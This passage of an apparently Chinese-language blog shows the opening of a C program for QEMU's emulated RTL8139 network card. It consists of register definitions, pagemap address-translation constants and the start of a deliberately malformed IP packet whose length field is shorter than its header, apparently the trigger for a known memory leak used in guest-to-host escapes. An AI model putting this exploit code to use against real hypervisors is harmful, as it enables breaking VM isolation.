</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span><span class=lnt>379
</span><span class=lnt>380
</span><span class=lnt>381
</span><span class=lnt>382
</span><span class=lnt>383
</span><span class=lnt>384
</span><span class=lnt>385
</span><span class=lnt>386
</span><span class=lnt>387
</span><span class=lnt>388
</span><span class=lnt>389
</span><span class=lnt>390
</span><span class=lnt>391
</span><span class=lnt>392
</span><span class=lnt>393
</span><span class=lnt>394
</span><span class=lnt>395
</span><span class=lnt>396
</span><span class=lnt>397
</span><span class=lnt>398
</span><span class=lnt>399
</span><span class=lnt>400
</span><span class=lnt>401
</span><span class=lnt>402
</span><span class=lnt>403
</span><span class=lnt>404
</span><span class=lnt>405
</span><span class=lnt>406
</span><span class=lnt>407
</span><span class=lnt>408
</span><span class=lnt>409
</span><span class=lnt>410
</span><span class=lnt>411
</span><span class=lnt>412
</span><span class=lnt>413
</span><span class=lnt>414
</span><span class=lnt>415
</span><span class=lnt>416
</span><span class=lnt>417
</span><span class=lnt>418
</span><span class=lnt>419
</span><span class=lnt>420
</span><span class=lnt>421
</span><span class=lnt>422
</span><span class=lnt>423
</span><span class=lnt>424
</span><span class=lnt>425
</span><span class=lnt>426
</span><span class=lnt>427
</span><span class=lnt>428
</span><span class=lnt>429
</span><span class=lnt>430
</span><span class=lnt>431
</span><span class=lnt>432
</span><span class=lnt>433
</span><span class=lnt>434
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/io.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// 页面相关
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define PAGE_SHIFT 12
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_PRESENT (1ULL &lt;&lt; 63)
</span></span></span><span class=line><span class=cl><span class=cp>#define PAGE_PFN ((1ULL &lt;&lt; 55) - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// RTL8139 PMIO base address
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define PMIO_BASE 0xC000
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// Ethernet Frame
</span></span></span><span class=line><span class=cl><span class=c1>// DST(6) + SRC(6) + Length/Type(2) + MTU(1500)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define RTL8139_BUFFER_SIZE 1514
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* w0 ownership flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_RX_OWN (1&lt;&lt;31)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* w0 ownership flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_OWN (1&lt;&lt;31)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* w0 end of ring flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_EOR (1&lt;&lt;30)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* first segment of received packet flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_FS (1&lt;&lt;29)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* last segment of received packet flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_LS (1&lt;&lt;28)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* large send packet flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_LGSEN (1&lt;&lt;27)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* large send MSS mask, bits 16...25 */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TC_LGSEN_MSS_MASK ((1 &lt;&lt; 12) - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* IP checksum offload flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_IPCS (1&lt;&lt;18)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* UDP checksum offload flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_UDPCS (1&lt;&lt;17)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* TCP checksum offload flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_TCPCS (1&lt;&lt;16)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* w0 bits 0...15 : buffer size */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_BUFFER_SIZE (1&lt;&lt;16)
</span></span></span><span class=line><span class=cl><span class=cp>#define CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* w1 add tag flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_TAGC (1&lt;&lt;17)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* w1 bits 0...15 : VLAN tag (big endian) */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* w2 low  32bit of Rx buffer ptr */</span>
</span></span><span class=line><span class=cl><span class=cm>/* w3 high 32bit of Rx buffer ptr */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* set after transmission */</span>
</span></span><span class=line><span class=cl><span class=cm>/* FIFO underrun flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_UNF (1&lt;&lt;25)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* transmit error summary flag, valid if set any of three below */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_TES (1&lt;&lt;23)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* out-of-window collision flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_OWC (1&lt;&lt;22)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* link failure flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_LNKF (1&lt;&lt;21)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* excessive collisions flag */</span>
</span></span><span class=line><span class=cl><span class=cp>#define CP_TX_STATUS_EXC (1&lt;&lt;20)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/* Symbolic offsets to registers. */</span>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>RTL8139_registers</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>MAC0</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span>        <span class=cm>/* Ethernet hardware address. */</span>
</span></span><span class=line><span class=cl>    <span class=n>MAR0</span> <span class=o>=</span> <span class=mi>8</span><span class=p>,</span>        <span class=cm>/* Multicast filter. */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxStatus0</span> <span class=o>=</span> <span class=mh>0x10</span><span class=p>,</span><span class=cm>/* Transmit status (Four 32bit registers). C mode only */</span>
</span></span><span class=line><span class=cl>                     <span class=cm>/* Dump Tally Conter control register(64bit). C+ mode only */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxAddr0</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>,</span>  <span class=cm>/* Tx descriptors (also four 32bit). */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxBuf</span> <span class=o>=</span> <span class=mh>0x30</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>ChipCmd</span> <span class=o>=</span> <span class=mh>0x37</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RxBufPtr</span> <span class=o>=</span> <span class=mh>0x38</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RxBufAddr</span> <span class=o>=</span> <span class=mh>0x3A</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>IntrMask</span> <span class=o>=</span> <span class=mh>0x3C</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>IntrStatus</span> <span class=o>=</span> <span class=mh>0x3E</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>TxConfig</span> <span class=o>=</span> <span class=mh>0x40</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RxConfig</span> <span class=o>=</span> <span class=mh>0x44</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Timer</span> <span class=o>=</span> <span class=mh>0x48</span><span class=p>,</span>        <span class=cm>/* A general-purpose counter. */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxMissed</span> <span class=o>=</span> <span class=mh>0x4C</span><span class=p>,</span>    <span class=cm>/* 24 bits valid, write clears. */</span>
</span></span><span class=line><span class=cl>    <span class=n>Cfg9346</span> <span class=o>=</span> <span class=mh>0x50</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Config0</span> <span class=o>=</span> <span class=mh>0x51</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Config1</span> <span class=o>=</span> <span class=mh>0x52</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>FlashReg</span> <span class=o>=</span> <span class=mh>0x54</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>MediaStatus</span> <span class=o>=</span> <span class=mh>0x58</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Config3</span> <span class=o>=</span> <span class=mh>0x59</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>Config4</span> <span class=o>=</span> <span class=mh>0x5A</span><span class=p>,</span>        <span class=cm>/* absent on RTL-8139A */</span>
</span></span><span class=line><span class=cl>    <span class=n>HltClk</span> <span class=o>=</span> <span class=mh>0x5B</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>MultiIntr</span> <span class=o>=</span> <span class=mh>0x5C</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PCIRevisionID</span> <span class=o>=</span> <span class=mh>0x5E</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>TxSummary</span> <span class=o>=</span> <span class=mh>0x60</span><span class=p>,</span> <span class=cm>/* TSAD register. Transmit Status of All Descriptors*/</span>
</span></span><span class=line><span class=cl>    <span class=n>BasicModeCtrl</span> <span class=o>=</span> <span class=mh>0x62</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>BasicModeStatus</span> <span class=o>=</span> <span class=mh>0x64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>NWayAdvert</span> <span class=o>=</span> <span class=mh>0x66</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>NWayLPAR</span> <span class=o>=</span> <span class=mh>0x68</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>NWayExpansion</span> <span class=o>=</span> <span class=mh>0x6A</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Undocumented registers, but required for proper operation. */</span>
</span></span><span class=line><span class=cl>    <span class=n>FIFOTMS</span> <span class=o>=</span> <span class=mh>0x70</span><span class=p>,</span>        <span class=cm>/* FIFO Control and test. */</span>
</span></span><span class=line><span class=cl>    <span class=n>CSCR</span> <span class=o>=</span> <span class=mh>0x74</span><span class=p>,</span>        <span class=cm>/* Chip Status and Configuration Register. */</span>
</span></span><span class=line><span class=cl>    <span class=n>PARA78</span> <span class=o>=</span> <span class=mh>0x78</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PARA7c</span> <span class=o>=</span> <span class=mh>0x7c</span><span class=p>,</span>        <span class=cm>/* Magic transceiver parameter register. */</span>
</span></span><span class=line><span class=cl>    <span class=n>Config5</span> <span class=o>=</span> <span class=mh>0xD8</span><span class=p>,</span>        <span class=cm>/* absent on RTL-8139A */</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* C+ mode */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxPoll</span>        <span class=o>=</span> <span class=mh>0xD9</span><span class=p>,</span>    <span class=cm>/* Tell chip to check Tx descriptors for work */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxMaxSize</span>    <span class=o>=</span> <span class=mh>0xDA</span><span class=p>,</span> <span class=cm>/* Max size of an Rx packet (8169 only) */</span>
</span></span><span class=line><span class=cl>    <span class=n>CpCmd</span>        <span class=o>=</span> <span class=mh>0xE0</span><span class=p>,</span> <span class=cm>/* C+ Command register (C+ mode only) */</span>
</span></span><span class=line><span class=cl>    <span class=n>IntrMitigate</span>    <span class=o>=</span> <span class=mh>0xE2</span><span class=p>,</span>    <span class=cm>/* rx/tx interrupt mitigation control */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxRingAddrLO</span>    <span class=o>=</span> <span class=mh>0xE4</span><span class=p>,</span> <span class=cm>/* 64-bit start addr of Rx ring */</span>
</span></span><span class=line><span class=cl>    <span class=n>RxRingAddrHI</span>    <span class=o>=</span> <span class=mh>0xE8</span><span class=p>,</span> <span class=cm>/* 64-bit start addr of Rx ring */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxThresh</span>    <span class=o>=</span> <span class=mh>0xEC</span><span class=p>,</span> <span class=cm>/* Early Tx threshold */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Bits in TxConfig. */</span>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>tx_config_bits</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=cm>/* Interframe Gap Time. Only TxIFG96 doesn&#39;t violate IEEE 802.3 */</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFGShift</span> <span class=o>=</span> <span class=mi>24</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFG84</span> <span class=o>=</span> <span class=p>(</span><span class=mi>0</span> <span class=o>&lt;&lt;</span> <span class=n>TxIFGShift</span><span class=p>),</span>    <span class=cm>/* 8.4us / 840ns (10 / 100Mbps) */</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFG88</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>TxIFGShift</span><span class=p>),</span>    <span class=cm>/* 8.8us / 880ns (10 / 100Mbps) */</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFG92</span> <span class=o>=</span> <span class=p>(</span><span class=mi>2</span> <span class=o>&lt;&lt;</span> <span class=n>TxIFGShift</span><span class=p>),</span>    <span class=cm>/* 9.2us / 920ns (10 / 100Mbps) */</span>
</span></span><span class=line><span class=cl>        <span class=n>TxIFG96</span> <span class=o>=</span> <span class=p>(</span><span class=mi>3</span> <span class=o>&lt;&lt;</span> <span class=n>TxIFGShift</span><span class=p>),</span>    <span class=cm>/* 9.6us / 960ns (10 / 100Mbps) */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>TxLoopBack</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>18</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>17</span><span class=p>),</span> <span class=cm>/* enable loopback test mode */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxCRC</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>),</span>    <span class=cm>/* DISABLE appending CRC to end of Tx packets */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxClearAbt</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>0</span><span class=p>),</span>    <span class=cm>/* Clear abort (WO) */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxDMAShift</span> <span class=o>=</span> <span class=mi>8</span><span class=p>,</span>        <span class=cm>/* DMA burst value (0-7) is shifted this many bits */</span>
</span></span><span class=line><span class=cl>    <span class=n>TxRetryShift</span> <span class=o>=</span> <span class=mi>4</span><span class=p>,</span>    <span class=cm>/* TXRR value (0-15) is shifted this many bits */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>TxVersionMask</span> <span class=o>=</span> <span class=mh>0x7C800000</span><span class=p>,</span> <span class=cm>/* mask out version bits 30-26, 23 */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Bits in RxConfig. */</span>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>rx_mode_bits</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptErr</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptRunt</span> <span class=o>=</span> <span class=mh>0x10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptBroadcast</span> <span class=o>=</span> <span class=mh>0x08</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptMulticast</span> <span class=o>=</span> <span class=mh>0x04</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptMyPhys</span> <span class=o>=</span> <span class=mh>0x02</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>AcceptAllPhys</span> <span class=o>=</span> <span class=mh>0x01</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>ChipCmdBits</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>CmdReset</span> <span class=o>=</span> <span class=mh>0x10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>CmdRxEnb</span> <span class=o>=</span> <span class=mh>0x08</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>CmdTxEnb</span> <span class=o>=</span> <span class=mh>0x04</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>RxBufEmpty</span> <span class=o>=</span> <span class=mh>0x01</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* C+ mode */</span>
</span></span><span class=line><span class=cl><span class=k>enum</span> <span class=n>CplusCmdBits</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>CPlusRxVLAN</span>   <span class=o>=</span> <span class=mh>0x0040</span><span class=p>,</span> <span class=cm>/* enable receive VLAN detagging */</span>
</span></span><span class=line><span class=cl>    <span class=n>CPlusRxChkSum</span> <span class=o>=</span> <span class=mh>0x0020</span><span class=p>,</span> <span class=cm>/* enable receive checksum offloading */</span>
</span></span><span class=line><span class=cl>    <span class=n>CPlusRxEnb</span>    <span class=o>=</span> <span class=mh>0x0002</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>CPlusTxEnb</span>    <span class=o>=</span> <span class=mh>0x0001</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// big endian
</span></span></span><span class=line><span class=cl><span class=c1>// ethernet frame
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>uint8_t</span> <span class=n>packet</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* 以太网帧 */</span>
</span></span><span class=line><span class=cl>    <span class=c1>// dst
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// src
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 类型(代表IP协议)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=cm>/* IP数据报 */</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 版本和首部长度
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>(</span><span class=mh>0x4</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// TOS
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 总长度
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 标识
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 标志(3bit)和片偏移(以8为基本单位，也就是相当于把标志的3bit当做0来计算)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// TTL
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x40</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 上层协议，代表TCP
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=mh>0x06</span><span class=p>,</span>
